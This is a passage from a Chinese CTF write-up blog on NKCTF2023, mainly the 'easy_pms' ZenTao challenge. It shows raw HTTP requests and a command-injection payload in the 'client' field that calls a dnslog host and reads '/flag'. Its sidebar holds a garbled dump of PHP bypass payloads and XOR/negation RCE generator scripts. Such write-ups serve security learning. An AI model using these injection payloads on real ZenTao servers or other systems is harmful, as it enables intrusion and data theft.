class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /repo-create.html HTTP/1.1</span><br><span class="line">Host: d90f9b70-c534-4f67-a498-6e40e2244ddd.node2.yuzhian.com.cn</span><br><span class="line">Content-Length: 113</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://90f9b70-c534-4f67-a498-6e40e2244ddd.node2.yuzhian.com.cn/repo-edit-1-0.html</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=default</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=</span><br></pre></td></tr></table></div></figure>
<p>可以看到cookie已经被激活了<br><img src="/2023/03/26/NKCTF2023/5.png"><br><img src="/2023/03/26/NKCTF2023/6.png"><br>我接下的思路就是使用命令执行来获取；提交命令执行的请求(并且外带回显)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /repo-edit-10000-10000.html HTTP/1.1</span><br><span class="line">Host: ******</span><br><span class="line">Content-Length: 26</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://******//repo-edit-1-0.html</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=default</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">SCM=Subversion&amp;client=`ping lm5nb8.dnslog.cn`</span><br></pre></td></tr></table></div></figure>
<p>就是在这个命令执行的时候出不来；<br><img src="/2023/03/26/NKCTF2023/7.png"><br>等wp出来后在学习一下；后面问了一下学长；发现是因为此RCE结果无法被外带；所以ping命令没有结果后面只需构造SCM&#x3D;Subversion&amp;client&#x3D;<code>tac /flag</code>即可获得flag<br><img src="/2023/03/26/NKCTF2023/7.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/03/26/NKCTF2023/">https://hyggevv.github.io/2023/03/26/NKCTF2023/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/03/29/NSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">NSS-反序列化</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/03/21/CTFHub-SSRF/"><span class="paginator-prev__text">CTFHub:SSRF</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-baby-php"><span class="toc-number">1.</span> <span class="toc-text">
          WEB:baby_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-eazy-php"><span class="toc-number">2.</span> <span class="toc-text">
          WEB:eazy_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9B%E5%BA%94%E8%AF%A5%E6%98%AF%E5%AF%B9%E4%BA%8E%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%9A%84%E7%BB%95%E8%BF%87%E6%98%AF%E5%85%B3%E4%BA%8Ea%E5%92%8Cb%E7%9A%84%E4%B8%80%E4%B8%AAMD5%E5%BC%B1%E6%AF%94%E8%BE%83%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%BB%95%E8%BF%87%E6%98%AFc%E5%92%8Cd%E7%9A%84%E4%B8%80%E4%B8%AAsha1%E5%BC%BA%E6%AF%94%E8%BE%83%EF%BC%9B%E8%BF%99%E4%B8%80%E9%83%A8%E5%88%86%E5%9C%A8%E5%AD%A6%E6%A0%A1%E7%9A%84%E7%AD%BE%E5%88%B0%E6%9D%AF%E5%B0%B1%E6%9C%89%E5%87%BA%E7%8E%B0%E8%BF%87%E6%89%80%E4%BB%A5%E4%BB%A4a-x3D-s878926199a-amp-b-x3D-s155964671a%E6%9D%A5%E7%BB%95%E8%BF%87%E7%AC%AC%E4%B8%80%E4%B8%AAMD5%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%9B%E7%84%B6%E5%90%8E%E6%9D%A5%E7%BB%95%E8%BF%87%E7%AC%AC%E4%BA%8C%E4%B8%AAsha1%E7%9A%84%E5%BC%BA%E6%AF%94%E8%BE%83%E6%8E%A5%E7%9D%80%E6%98%AF%E5%AF%B9%E4%BA%8Eintval%E7%9A%84%E7%BB%95%E8%BF%87%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%95%B0%E7%82%B9%E6%9D%A5%E7%BB%95%E8%BF%87e-x3D-114514-1%EF%BC%9B%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E7%BB%95%E8%BF%87%E5%9C%A8NSS-Round7%E6%9C%89%E5%87%BA%E7%8E%B0%E8%BF%87%EF%BC%9B%E7%9B%B4%E6%8E%A5%E4%BB%A4NS-CTF-go-x3D-1%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%EF%BC%9B%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%98%AF%E5%AF%B9%E4%BA%8Epreg-match%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%9B%E6%AD%A4%E6%97%B6%E5%8F%AF%E4%BB%A5%E8%80%83%E8%99%91%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E6%88%96%E8%80%85%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E5%8F%88%E6%88%96%E8%80%85%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%871-%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%EF%BC%9A%E5%85%88%E7%94%9F%E7%94%A8php%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E6%89%80%E4%BB%A5%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84%E5%BC%82%E6%88%96%E6%9E%84%E9%80%A0%E7%9A%84txt%E6%96%87%E6%A1%A3%E6%8E%A5%E7%9D%80%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E6%9D%A5%E5%BE%97%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E7%9A%84%E5%BC%82%E6%88%96%E7%BB%93%E6%9E%9C2-%E4%BD%BF%E7%94%A8%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87easy-pms-%E8%BF%99%E9%A2%98%E6%9C%89%E6%80%9D%E8%B7%AF%E4%BD%86%E6%98%AF%E6%9C%80%E5%90%8E%E8%BF%98%E6%98%AF%E6%B2%A1%E6%9C%89%E5%81%9A%E5%87%BA%E6%9D%A5"><span class="toc-number">3.</span> <span class="toc-text">
          打开后发现是代码审计；应该是对于一些函数的绕过第一个的绕过是关于a和b的一个MD5弱比较第二个绕过是c和d的一个sha1强比较；这一部分在学校的签到杯就有出现过所以令a&#x3D;s878926199a&amp;b&#x3D;s155964671a来绕过第一个MD5弱比较；然后1c&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1来绕过第二个sha1的强比较接着是对于intval的绕过直接使用小数点来绕过e&#x3D;114514.1；接下来的绕过在NSS Round7有出现过；直接令NS[CTF.go&#x3D;1就可以绕过；接下来是对于preg_match的绕过；此时可以考虑异或绕过或者取反绕过又或者回溯绕过1.异或绕过：先生用php生成一个所以可见字符的异或构造的txt文档123456789101112131415161718192021222324252627282930313233343536373839&lt;?php&#x2F;*author yu22x*&#x2F;$myfile &#x3D; fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) {     for ($j&#x3D;0; $j &lt;256 ; $j++) {         if($i&lt;16){            $hex_i&#x3D;&#39;0&#39;.dechex($i);        }        else{            $hex_i&#x3D;dechex($i);        }        if($j&lt;16){            $hex_j&#x3D;&#39;0&#39;.dechex($j);        }        else{            $hex_j&#x3D;dechex($j);        }        $preg &#x3D; &#39;&#x2F;[a-z0-9]&#x2F;i&#39;; &#x2F;&#x2F;根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){                    echo &quot;&quot;;    }        else{        $a&#x3D;&#39;%&#39;.$hex_i;        $b&#x3D;&#39;%&#39;.$hex_j;        $c&#x3D;(urldecode($a)^urldecode($b));        if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) {            $contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        }    }}}fwrite($myfile,$contents);fclose($myfile);接着使用脚本来得到我们想要的异或结果1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)while True:   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)2.使用取反绕过1234567891011121314&lt;?php&#x2F;&#x2F;在命令行中运行&#x2F;*author yu22x*&#x2F;fwrite(STDOUT,&#39;[+]your function: &#39;);$system&#x3D;str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#39;[+]your command: &#39;);$command&#x3D;str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;easy_pms(这题有思路但是最后还是没有做出来)</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">110</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>